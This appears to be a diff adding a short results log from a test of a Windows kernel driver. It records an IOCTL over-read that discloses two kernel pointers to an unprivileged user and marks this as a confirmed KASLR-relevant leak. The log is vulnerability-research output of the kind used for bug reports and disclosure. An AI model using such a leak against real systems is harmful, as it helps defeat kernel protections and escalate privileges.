@@ -1,0 +1,7 @@
+opened \\?\GLOBALROOT\Device\nmgms as dzuser
+IOCTL 0x00222554 returned 768 bytes of driver .data (over-read from a 1-byte global):
+    output +0x121  0xFFFFF8004A950590  <== kernel pointer
+    output +0x129  0xFFFFC38159EB1B10  <== kernel pointer
+
+2 distinct kernel-mode pointer(s) disclosed to an unprivileged caller.
+CONFIRMED kernel address disclosure (KASLR-relevant).
